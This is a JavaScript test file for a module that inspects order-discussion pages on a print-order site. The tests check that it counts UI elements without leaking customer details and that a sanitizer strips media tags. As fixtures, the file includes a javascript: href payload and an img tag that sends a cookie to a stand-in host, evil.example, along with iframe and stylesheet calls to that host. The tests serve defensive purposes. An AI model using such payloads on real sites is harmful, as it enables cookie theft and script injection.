import test from 'node:test';
import assert from 'node:assert/strict';
import {inspectOrderDiscussionDom,mergeDiscussionProbes}
  from '../vision/orders/discussion-probe.mjs';
import {inertOrderDiscussionHtml} from '../vision/orders/order-page-discovery.mjs';

function control(text,{scope='article',href='',title='',action='',isAgree=false}={}){
  return {
    textContent:text,
    getAttribute:key=>({
      href,title,'data-action':action,'aria-label':'','data-toggle':'',
      'data-target':''
    })[key]??null,
    closest:selector=>selector.startsWith('#vision')?null:
      selector.includes('[data-orderitemid]')?
        (scope==='article'?{tagName:'TR'}:null):
      selector.includes('.cart-order')?
        (scope==='order'?{tagName:'DIV'}:null):null,
    tagName:'BUTTON'
  };
}
function message(text){
  return {
    textContent:text,
    querySelectorAll:selector=>selector.startsWith('.comment-body')?
      [{textContent:text}]:[]
  };
}
function thread(messages=[],images=[]){
  return {
    closest:()=>null,
    querySelectorAll:selector=>selector.startsWith('[data-comment-id]')?
      messages:selector==='img,picture,video,a[href]'?images:[]
  };
}
function doc(controls=[],threads=[]){
  return {querySelectorAll:selector=>selector.startsWith('a[href]')?controls:
    selector.startsWith('[data-discussion-id]')?threads:[]};
}
const image=()=>({tagName:'IMG',getAttribute:()=>null});

test('detects scoped discussion UI and categorizes visible text without exposing author, message or URLs',()=>{
 const raw='Секрет: Иван +7 900 100-00-00. Толщина линии и пробел 0,1 мм. ';
 const ui=doc([
   control('Обсуждение по артикулу',{href:'#article-chat'}),
   control('Комментарии',{scope:'order',href:'/private/comments?order=8000001'}),
   control('Согласования макетов',{title:'Обсуждение и согласование',
       scope:'order',href:'/private/approve'}),
   control('other',{action:'openDiscussion',scope:'unresolved'}),
   control('Написать в обсуждение',{href:'https://customer.example/secret',scope:'unresolved'})
 ],[
   thread([message(raw)], [image()])
 ]);
 const result=inspectOrderDiscussionDom(ui);
 assert.equal(result.status,'STRUCTURE_ONLY_UNVERIFIED');
 assert.equal(result.controls_total,4);
 assert.equal(result.article_scoped_controls,1);
 assert.equal(result.order_scoped_controls,1);
 assert.equal(result.unresolved_scope_controls,2);
 assert.equal(result.link_targets_fragments,1);
 assert.equal(result.link_targets_internal_test,1);
 assert.equal(result.link_targets_untrusted_or_external,1);
 assert.equal(result.js_or_opaque_controls,1);
 assert.equal(result.inline_thread_candidates,1);
 assert.equal(result.visible_message_candidates,1);
 assert.equal(result.screenshot_or_image_candidates,1);
 assert.deepEqual(result.weak_topic_candidates,['negative_min','positive_min']);
 assert.equal(result.customer_text_included,false);
 assert.equal(result.expert_label_verified,false);
 assert.equal(result.discussion_endpoint_verified,false);
 assert.equal(result.training_ready,false);
 const safe=JSON.stringify(result);
 for(const leaked of ['Иван','+7 900','8000001','0,1','customer.example',
                       'секрет','Согласования']) assert.equal(safe.includes(leaked),false);
});

test('does not execute original order handlers, follow screenshot or chat links',()=>{
 let touches=0;
 const dangerous=control('Обсуждение',{href:'javascript:fetch("/danger")'});
 dangerous.getAttribute=key=>{
   touches++;
   if(key==='href')return 'javascript:alert("secret")';
   return '';
 };
 const out=inspectOrderDiscussionDom(doc([dangerous]));
 assert.equal(out.controls_total,1);
 assert.equal(out.js_or_opaque_controls,1);
 assert.equal(out.screenshot_or_image_candidates,0);
 assert.equal(out.visible_message_candidates,0);
 assert.equal(out.training_ready,false);
 assert.ok(touches>0);
});

test('probes merge categorical counts only and never produce trusted training labels',()=>{
 const first=inspectOrderDiscussionDom(doc([control('Обсуждения',{href:'#modal'})],
   [thread([message('RGB'),message('живые шрифты')],[image()])]));
 const second=inspectOrderDiscussionDom(doc([control('Показать комментарии',{scope:'order'})]));
 const combined=mergeDiscussionProbes(first,second);
 assert.equal(combined.controls_total,2);
 assert.equal(combined.visible_message_candidates,2);
 assert.equal(combined.screenshot_or_image_candidates,1);
 assert.deepEqual(combined.weak_topic_candidates,['color','font']);
 assert.equal(combined.training_ready,false);
 assert.equal(combined.discussion_content_complete,false);
 assert.equal(combined.screenshot_roi_verified,false);
});

test('missing/malformed DOM never counts as evidence of defect-free artwork',()=>{
 for(const el of [null,undefined,{}, {querySelectorAll:()=>{throw Error('private') }}]){
   const x=inspectOrderDiscussionDom(el);
   assert.equal(x.training_ready,false);
   assert.equal(x.expert_label_verified,false);
   assert.equal(x.controls_total,0);
   assert.equal(JSON.stringify(x).includes('private'),false);
 }
});

test('inert order-card parser strips media and stylesheet tags without opening private screenshot URLs',()=>{
 const source='<div class="discussion-list"><div class="comment-item">'+
   '<p class="comment-body">Пробел узкий</p>'+
   '<a href="/attachments/secret.png"><img src="https://evil.example/log?cookie=private" alt="screenshot"></a>'+
   '<iframe src="https://evil.example/iframe"></iframe>'+
   '<link rel="stylesheet" href="https://evil.example/css">'+
   '<svg><image href="https://evil.example/svg.png"/></svg></div></div>';
 const sanitized=inertOrderDiscussionHtml(source);
 assert.ok(sanitized.includes('data-vision-media-candidate'));
 assert.ok(sanitized.includes('/attachments/secret.png'),'Links are inert references, not fetched');
 assert.ok(!sanitized.includes('<img'));
 assert.ok(!sanitized.includes('<iframe'));
 assert.ok(!sanitized.includes('<link'));
 assert.ok(!sanitized.includes('<image'));
 assert.ok(!sanitized.includes('evil.example'));
 assert.ok(sanitized.includes('Пробел узкий'));
 assert.equal(inertOrderDiscussionHtml('<img src="unterminated'),null);
 assert.equal(inertOrderDiscussionHtml(null),null);
});
